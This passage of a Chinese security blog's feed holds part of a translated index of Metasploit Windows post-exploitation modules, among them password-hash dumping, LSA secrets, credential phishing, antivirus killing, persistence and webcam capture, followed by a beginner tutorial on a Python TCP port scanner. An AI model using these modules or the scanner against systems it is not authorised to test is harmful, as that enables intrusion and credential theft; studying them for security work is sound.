Windows收集枚举域组</div><div class="line">post/windows/gather/enum_domain_tokens                             Windows收集枚举域令牌</div><div class="line">post/windows/gather/enum_domain_users                              Windows收集枚举活动域用户</div><div class="line">post/windows/gather/enum_domains                                   Windows收集域枚举</div><div class="line">post/windows/gather/enum_emet                                      Windows收集EMET保护路径</div><div class="line">post/windows/gather/enum_files                                     Windows收集通用文件集合</div><div class="line">post/windows/gather/enum_hostfile                                  Windows收集Windows主机文件枚举</div><div class="line">post/windows/gather/enum_ie                                        Windows收集Internet Explorer用户数据枚举</div><div class="line">post/windows/gather/enum_logged_on_users                           Windows收集登录用户枚举（注册表）</div><div class="line">post/windows/gather/enum_ms_product_keys                           Windows收集产品密钥</div><div class="line">post/windows/gather/enum_muicache                                  Windows收集枚举用户MUICache</div><div class="line">post/windows/gather/enum_patches                                   Windows收集应用的补丁</div><div class="line">post/windows/gather/enum_powershell_env                            Windows收集Powershell环境设置枚举</div><div class="line">post/windows/gather/enum_prefetch                                  Windows收集预取文件信息</div><div class="line">post/windows/gather/enum_proxy                                     Windows收集代理设置</div><div class="line">post/windows/gather/enum_putty_saved_sessions                      PuTTY保存的会话枚举模块</div><div class="line">post/windows/gather/enum_services                                  Windows收集服务信息枚举</div><div class="line">post/windows/gather/enum_shares                                    Windows通过注册表收集SMB共享枚举</div><div class="line">post/windows/gather/enum_snmp                                      Windows收集SNMP设置枚举（注册表）</div><div class="line">post/windows/gather/enum_termserv                                  Windows收集终端服务器客户端连接信息转储</div><div class="line">post/windows/gather/enum_tokens                                    Windows收集枚举域管理令牌（令牌猎人）</div><div class="line">post/windows/gather/enum_tomcat                                    Windows收集Apache Tomcat枚举</div><div class="line">post/windows/gather/enum_trusted_locations                         Windows收集Microsoft Office信任的位置</div><div class="line">post/windows/gather/enum_unattend                                  Windows收集无人值守的答案文件枚举</div><div class="line">post/windows/gather/file_from_raw_ntfs                             Windows文件从原始NTFS收集文件</div><div class="line">post/windows/gather/forensics/browser_history                      Windows收集Skype，Firefox和Chrome人工制品</div><div class="line">post/windows/gather/forensics/duqu_check                           Windows收集法医Duqu注册表检查</div><div class="line">post/windows/gather/forensics/enum_drives                          Windows收集物理驱动器和逻辑卷</div><div class="line">post/windows/gather/forensics/imager                               Windows收集法医成像</div><div class="line">post/windows/gather/forensics/nbd_server                           Windows收集本地NBD服务器</div><div class="line">post/windows/gather/forensics/recovery_files                       Windows收集删除的文件枚举和恢复</div><div class="line">post/windows/gather/hashdump                                       Windows收集本地用户帐户密码哈希（注册表）</div><div class="line">post/windows/gather/local_admin_search_enum                        Windows收集本地管理员搜索</div><div class="line">post/windows/gather/lsa_secrets                                    Windows枚举LSA秘密</div><div class="line">post/windows/gather/make_csv_orgchart                              使用管理器信息生成CSV组织图数据</div><div class="line">post/windows/gather/memory_grep                                    Windows收集过程内存Grep</div><div class="line">post/windows/gather/netlm_downgrade                                Windows NetLM降级攻击</div><div class="line">post/windows/gather/ntds_location                                  发布Windows收集NTDS.DIT位置</div><div class="line">post/windows/gather/outlook                                        Windows收集Outlook电子邮件</div><div class="line">post/windows/gather/phish_windows_credentials                      Windows收集用户凭据（网络钓鱼）</div><div class="line">post/windows/gather/resolve_sid                                    Windows收集本地用户帐户SID查找</div><div class="line">post/windows/gather/reverse_lookup                                 Windows收集IP范围反向查找</div><div class="line">post/windows/gather/screen_spy                                     Windows收集屏幕间谍</div><div class="line">post/windows/gather/smart_hashdump                                 Windows收集本地和域控制器帐户密码哈希</div><div class="line">post/windows/gather/tcpnetstat                                     Windows收集TCP Netstat</div><div class="line">post/windows/gather/usb_history                                    Windows收集USB驱动器历史记录</div><div class="line">post/windows/gather/win_privs                                      Windows收集特权枚举</div><div class="line">post/windows/gather/wmic_command                                   Windows收集运行指定的WMIC命令</div><div class="line">post/windows/gather/word_unc_injector                              Windows收集Microsoft Office Word UNC路径注入器</div><div class="line">post/windows/manage/add_user_domain                                Windows管理将用户添加到域和/或域组</div><div class="line">post/windows/manage/archmigrate                                    架构迁移</div><div class="line">post/windows/manage/change_password                                Windows管理更改密码</div><div class="line">post/windows/manage/clone_proxy_settings                           Windows管理代理设置克隆</div><div class="line">post/windows/manage/delete_user                                    Windows管理本地用户帐户删除</div><div class="line">post/windows/manage/download_exec                                  Windows管理下载和/或执行</div><div class="line">post/windows/manage/driver_loader                                  Windows管理驱动程序加载程序</div><div class="line">post/windows/manage/enable_rdp                                     Windows管理启用远程桌面</div><div class="line">post/windows/manage/enable_support_account                         Windows管理木马支持帐户</div><div class="line">post/windows/manage/exec_powershell                                Windows Powershell执行后期模块</div><div class="line">post/windows/manage/forward_pageant                                将SSH代理请求转发到远程站点</div><div class="line">post/windows/manage/hashcarve                                      Windows本地用户帐户哈希卡弗</div><div class="line">post/windows/manage/ie_proxypac                                    Windows管理代理PAC文件</div><div class="line">post/windows/manage/inject_ca                                      Windows管理证书颁发机构注入</div><div class="line">post/windows/manage/inject_host                                    Windows管理主机文件注入</div><div class="line">post/windows/manage/killav                                         Windows Post杀死病毒和臀部</div><div class="line">post/windows/manage/migrate                                        Windows管理进程迁移</div><div class="line">post/windows/manage/mssql_local_auth_bypass                        Windows管理本地Microsoft SQL Server授权绕过</div><div class="line">post/windows/manage/multi_meterpreter_inject                       Windows管理在内存中注入多个有效负载</div><div class="line">post/windows/manage/nbd_server                                     Windows远程磁盘管理本地NBD服务器</div><div class="line">post/windows/manage/payload_inject                                 Windows管理内存有效载荷注入模块</div><div class="line">post/windows/manage/persistence_exe                                Windows管理持久的EXE Payload安装程序</div><div class="line">post/windows/manage/portproxy                                      Windows管理端口转发PortProxy</div><div class="line">post/windows/manage/powershell/build_net_code                      Powershell .NET编译器</div><div class="line">post/windows/manage/powershell/exec_powershell                     Windows管理PowerShell下载和/或执行</div><div class="line">post/windows/manage/powershell/load_script                         将脚本加载到PowerShell会话中</div><div class="line">post/windows/manage/pptp_tunnel                                    Windows管理远程点对点隧道协议</div><div class="line">post/windows/manage/priv_migrate                                   Windows管理基于权限的进程迁移</div><div class="line">post/windows/manage/pxeexploit                                     Windows管理PXE漏洞服务器</div><div class="line">post/windows/manage/reflective_dll_inject                          Windows管理反射式DLL注入模块</div><div class="line">post/windows/manage/remove_ca                                      Windows管理证书颁发机构删除</div><div class="line">post/windows/manage/remove_host                                    Windows管理主机文件删除</div><div class="line">post/windows/manage/rpcapd_start                                   Windows管理远程数据包捕获服务启动器</div><div class="line">post/windows/manage/run_as                                         Windows管理运行命令作为用户</div><div class="line">post/windows/manage/run_as_psh                                     Windows“运行”使用Powershell</div><div class="line">post/windows/manage/sdel                                           Windows管理安全删除</div><div class="line">post/windows/manage/sticky_keys                                    粘键保持模块</div><div class="line">post/windows/manage/vmdk_mount                                     Windows管理VMDK安装驱动器</div><div class="line">post/windows/manage/vss_create                                     Windows管理创建卷影副本</div><div class="line">post/windows/manage/vss_list                                       Windows管理列表卷影副本</div><div class="line">post/windows/manage/vss_mount                                      Windows管理安装阴影复制</div><div class="line">post/windows/manage/vss_set_storage                                Windows管理设置卷影复制存储空间</div><div class="line">post/windows/manage/vss_storage                                    Windows管理获取卷影复制存储信息</div><div class="line">post/windows/manage/wdigest_caching                                Windows发布管理WDigest凭据缓存</div><div class="line">post/windows/manage/webcam                                         Windows管理网络摄像头</div><div class="line">post/windows/recon/computer_browser_discovery                      Windows Recon计算机浏览器发现</div><div class="line">post/windows/recon/outbound_ports                                  Windows出站过滤规则</div><div class="line">post/windows/recon/resolve_ip                                      Windows Recon解析IP</div><div class="line">post/windows/wlan/wlan_bss_list                                    Windows收集无线BSS信息</div><div class="line">post/windows/wlan/wlan_current_connection                          Windows收集无线当前连接信息</div><div class="line">post/windows/wlan/wlan_disconnect                                  Windows断开无线连接</div><div class="line">post/windows/wlan/wlan_profile                                     Windows收集无线配置文件</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;div id=&quot;aplayer1&quot; class=&quot;aplayer&quot; style=&quot;margin-bottom: 20px;&quot;&gt;&lt;/div&gt;
		&lt;script&gt;
			new APlayer({
				element: document.getElementById(&quot;aplayer1&quot;),
				narrow: false,
				autoplay: true,
				showlrc: 0,
				music: {
					title: &quot;六月的雨&quot;,
					author: &quot;胡歌&quot;,
					url: &quot;/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3&quot;,
					pic: &quot;/Music/233.jpg&quot;,
				}
			});
		&lt;/script&gt;
&lt;p&gt;整理在一起，用的时候也比较方便&lt;/p&gt;
    
    </summary>
    
    
      <category term="Metasploit-Framework" scheme="https://damit5.com/tags/Metasploit-Framework/"/>
    
  </entry>
  
  <entry>
    <title>Python实现简单端口扫描器的编写</title>
    <link href="https://damit5.com/2017/09/30/Python%E5%AE%9E%E7%8E%B0%E7%AE%80%E5%8D%95%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8%E7%9A%84%E7%BC%96%E5%86%99/"/>
    <id>https://damit5.com/2017/09/30/Python实现简单端口扫描器的编写/</id>
    <published>2017-09-30T05:36:55.000Z</published>
    <updated>2018-06-10T03:53:13.003Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><h2 id="0×00-前言"><a href="#0×00-前言" class="headerlink" title="0×00 前言"></a>0×00 前言</h2><p>没错，这就是上个帖子所说的简单的端口扫描器</p><p>加了颜色过后确实逼格猛涨</p><p>废话不多说，开始记录下这有趣的故事</p><a id="more"></a><h2 id="0×01-正文"><a href="#0×01-正文" class="headerlink" title="0×01 正文"></a>0×01 正文</h2><h4 id="Step-0-意淫一下写这个扫描器的思路"><a href="#Step-0-意淫一下写这个扫描器的思路" class="headerlink" title="Step 0 : 意淫一下写这个扫描器的思路"></a>Step 0 : 意淫一下写这个扫描器的思路</h4><ul><li>用户输入网址，转换为IP（直接IP也行）</li><li>传入的参数需要用 sys 来判定</li><li>需要使用socket模块来完成端口的扫描</li><li>扫描单独写一个方法</li><li>终端输出改变颜色提升逼格<h4 id="Step-1-引入我们需要的模块"><a href="#Step-1-引入我们需要的模块" class="headerlink" title="Step 1 : 引入我们需要的模块"></a>Step 1 : 引入我们需要的模块</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">import sys</div><div class="line">import socket</div><div class="line">from color import *</div></pre></td></tr></table></figure></li></ul><h4 id="Step-2-扫描端口是否开启的方法-scan"><a href="#Step-2-扫描端口是否开启的方法-scan" class="headerlink" title="Step 2 : 扫描端口是否开启的方法 scan()"></a>Step 2 : 扫描端口是否开启的方法 scan()</h4><h5 id="设置超时时间，防止等太久"><a href="#设置超时时间，防止等太久" class="headerlink" title="设置超时时间，防止等太久"></a>设置超时时间，防止等太久</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">socket.setdefaulttimeout(3)</div></pre></td></tr></table></figure><h5 id="创建一个socket对象"><a href="#创建一个socket对象" class="headerlink" title="创建一个socket对象"></a>创建一个<code>socket</code>对象</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</div></pre></td></tr></table></figure><p><code>AF_INET</code> 表示IPV4</p><p><code>SOCK_STREAM</code> 表示TCP</p><h5 id="然后用connect方法连接"><a href="#然后用connect方法连接" class="headerlink" title="然后用connect方法连接"></a>然后用<code>connect</code>方法连接</h5><blockquote><p>PS : connect()中传入的是一个tuple<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">s.connect((ip,port))</div></pre></td></tr></table></figure></p></blockquote><h4 id="Step-3-主函数的书写（获取IP和端口）"><a href="#Step-3-主函数的书写（获取IP和端口）" class="headerlink" title="Step 3 : 主函数的书写（获取IP和端口）"></a>Step 3 : 主函数的书写（获取IP和端口）</h4><h5 id="判断是否传入正确的参数"><a href="#判断是否传入正确的参数" class="headerlink" title="判断是否传入正确的参数"></a>判断是否传入正确的参数</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">if len(sys.argv) == 2:</div><div class="line"></div><div class="line">else:</div><div class="line">    print &apos;usage : python portscan.py &lt;url&gt;&apos;</div></pre></td></tr></table></figure><h5 id="获取传入参数的IP地址和想要扫描的端口"><a href="#获取传入参数的IP地址和想要扫描的端口" class="headerlink" title="获取传入参数的IP地址和想要扫描的端口"></a>获取传入参数的IP地址和想要扫描的端口</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">url = sys.argv[1]</div><div class="line">ip = socket.gethostbyname(url)</div><div class="line">portlist = [22,80,81,445,3306,3389,8080]</div></pre></td></tr></table></figure><h5 id="将端口和IP使用scan-方法进行测试"><a href="#将端口和IP使用scan-方法进行测试" class="headerlink" title="将端口和IP使用scan()方法进行测试"></a>将端口和IP使用scan()方法进行测试</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">for port in portlist:</div><div class="line">    result = scan(ip,port)</div><div class="line">    if result:</div><div class="line">        printGreen (&apos;[+] Port %d is open&apos; %port)</div><div class="line">    else:</div><div class="line">        printRed (&apos;[-] Port %d is closed&apos; %port)</div></pre></td></tr></table></figure><h2 id="0×02-测试结果"><a href="#0×02-测试结果" class="headerlink" title="0×02 测试结果"></a>0×02 测试结果</h2><p><img src="//r.photo.store.qq.com/psb?/V12DlJ9S2zSi6P/P2.49hByZWzkP3ezOtTOULCciFPS*NuNVfqoxWT4zIA!/r/dHYBAAAAAAAA" alt="damit5"><br><img src="//r.photo.store.qq.com/psb?/V12DlJ9S2zSi6P/w1rAOST0SYL7VJLKyqwzS7FJZCe9v.iaHwTahTw9Zb0!/r/dIUBAAAAAAAA" alt="local"></p><div id="aplayer15" class="aplayer" style="margin-bottom: 20px;"></div><script>new APlayer({element: document.getElementById("aplayer15"),narrow: false,autoplay: true,showlrc: 0,music: {title: "六月的雨",author: "胡歌",url: "/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3",pic: "/Music/233.jpg",}});</script>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0×00-前言&quot;&gt;&lt;a href=&quot;#0×00-前言&quot; class=&quot;headerlink&quot; title=&quot;0×00 前言&quot;&gt;&lt;/a&gt;0×00 前言&lt;/h2&gt;&lt;p&gt;没错，这就是上个帖子所说的简单的端口扫描器&lt;/p&gt;
&lt;p&gt;加了颜色过后确实逼格猛涨&lt;/p&gt;
&lt;p&gt;废话不多说，开始记录下这有趣的故事&lt;/p&gt;
    
    </summary>
    
    
      <category term="Python" scheme="https://damit5.com/tags/Python/"/>
    
  </entry>
  
</feed>
